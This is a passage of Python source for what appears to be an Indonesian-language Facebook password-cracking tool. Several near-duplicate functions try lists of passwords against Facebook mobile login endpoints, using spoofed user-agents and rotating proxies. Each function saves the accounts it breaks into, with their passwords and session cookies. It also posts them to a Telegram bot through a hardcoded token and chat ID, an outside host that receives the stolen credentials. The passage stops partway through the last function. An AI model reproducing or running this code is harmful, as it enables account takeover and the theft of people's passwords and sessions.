	ug = random.choice(['Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'])
	ses = requests.Session()
	for pw in pwv:
		try:
			#if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ug,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=9af15271c748d378ef8bc2b720b79e63&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree (nel(f"                        {P2}AKUN CP",style="bold yellow"))
				tree.add(nel.fit(f"[bold yellow]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{K2}{pw}",style=f"bold white"))
				tree.add(nel.fit(f"[bold yellow]{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold yellow]{ua}",width=70,title=f"[bold yellow] CP ",style=f"bold white"))
				cetak(nel(tree,style="bold yellow"))
				requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={idf}|{pw}| result CP").json()
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree (nel(f"                        {O2}LIVE OK",style="bold green"))
				tree.add(nel.fit(f"[bold purple]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{pw}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold purple]{kuki}",width=70,style=f"bold white"))
				cetak(nel(tree,style="bold green"))
				requests.post(f"https://api.telegram.org/bot5776502345:AAEoP3n6amtGewprF9ZHJcffjxXseNi6v5E/sendMessage?chat_id=5384702841&text={idf}|{pw}|{tahun(idf)} RESULT OK").json()
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###----------[ MOBILE V2 ]---------- ###
def crackb(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[cyan]B-Graph[white] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.86 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.86 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.86 Mobile Safari/537.36'])
	ug = random.choice(['Mozilla/5.0 (Linux; U; Android 6.0.1; id-id; Redmi Note 4 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.85 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.2.15','Mozilla/5.0 (Linux; U; Android 9; en-us; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.17','Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16','Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba','Mozilla/5.0 (Linux; Android 8.0.0; SM-J810G Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; TA-1032 Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36','Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20190227 Firefox/35.0','Mozilla/5.0 (Windows CE) AppleWebKit/5351 (KHTML, like Gecko) Chrome/38.0.886.0 Mobile Safari/5351','Mozilla/5.0 (Windows NT 5.2; en-US; rv:1.9.0.20) Gecko/20110321 Firefox/37.0','Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X; sl-SI) AppleWebKit/532.22.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B118 Safari/6532.22.4','Opera/9.90 (X11; Linux x86_64; sl-SI) Presto/2.12.337 Version/12.00','Internet Explorer','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/5.1)'])
	ses = requests.Session()
	for pw in pwv:
		try:
			#if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxy= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ug,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.9/dialog/oauth/?platform=facebook&client_id=1862952583919182&response_type=token&redirect_uri=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F&state=%7B%22client_id%22%3A%221862952583919182%22%2C%22network%22%3A%22facebook%22%2C%22display%22%3A%22popup%22%2C%22callback%22%3A%22_hellojs_7q9rily9%22%2C%22state%22%3A%22%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%22%2C%22scope%22%3A%22basic%22%7D&scope=public_profile&auth_type=reauthenticate&display=popup h2","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="101", "Google Chrome";v="111", "Not;A=Brand";v="110"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'none','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree (nel(f"                            {P2}AKUN CP",style="bold yellow"))
				tree.add(nel.fit(f"[bold yellow]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{K2}{pw}",style=f"bold white"))
				tree.add(nel.fit(f"[bold yellow]{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold yellow]{ua}",width=70,title=f"[bold yellow] CP ",style=f"bold white"))
				cetak(nel(tree,style="bold yellow"))
				requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={idf}|{pw}| result CP").json()
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree (nel(f"                        {O2}LIVE OK",style="bold green"))
				tree.add(nel.fit(f"[bold purple]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{pw}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold purple]{kuki}",width=70,style=f"bold white"))
				cetak(nel(tree,style="bold green"))
				requests.post(f"https://api.telegram.org/bot5776502345:AAEoP3n6amtGewprF9ZHJcffjxXseNi6v5E/sendMessage?chat_id=5384702841&text={idf}|{pw}|{tahun(idf)} RESULT OK").json()
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###----------[ MOBILE V3 ]---------- ###
def crackf(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; MI 8 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; MI 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36'])
	ug = random.choice(['Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.1.26','Mozilla/5.0 (Linux; U; Android 7.1.2; en-us; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.1.26'])
	ses = requests.Session()
	for pw in pwv:
		try:
			#if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ug,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=357217396249062&kid_directed_site=0&app_id=357217396249062&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D357217396249062%26cbt%3D1660115235328%26e2e%3D%257B%2522init%2522%253A1660115235328%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dfc50efe4-eeb1-4edb-8ea3-3949f7053ea8%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eaccb860-7eb9-412c-8ca3-aefd70d83a17%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%252266l196vgaeoubjuivhtd%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FAL').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://www.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Fasync%2Fregistration%2F',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree (nel(f"                        {P2}AKUN CP",style="bold yellow"))
				tree.add(nel.fit(f"[bold yellow]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{K2}{pw}",style=f"bold white"))
				tree.add(nel.fit(f"[bold yellow]{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold yellow]{ua}",width=70,title=f"[bold yellow] CP ",style=f"bold white"))
				cetak(nel(tree,style="bold yellow"))
				requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={idf}|{pw}| result CP").json()
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree (nel(f"                        {O2}LIVE OK",style="bold green"))
				tree.add(nel.fit(f"[bold purple]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{pw}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold purple]{kuki}",width=70,style=f"bold white"))
				cetak(nel(tree,style="bold green"))
				requests.post(f"https://api.telegram.org/bot5776502345:AAEoP3n6amtGewprF9ZHJcffjxXseNi6v5E/sendMessage?chat_id=5384702841&text={idf}|{pw}|{tahun(idf)} RESULT OK").json()
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###----------[ MOBILE V4 ]---------- ###
def crackz(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(['Mozilla/5.0 (Linux; Android 9; vivo 1723) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36'])
	ug = random.choice(['Mozilla/5.0 (Linux; Android 7.1.1; vivo Y75A Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.3.0.0','Mozilla/5.0 (Linux; Android 10; V2002A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.3.0.0'])
	ses = requests.Session()
	for pw in pwv:
		try:
			#if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ug,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree (nel(f"                        {P2}AKUN CP",style="bold yellow"))
				tree.add(nel.fit(f"[bold yellow]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{K2}{pw}",style=f"bold white"))
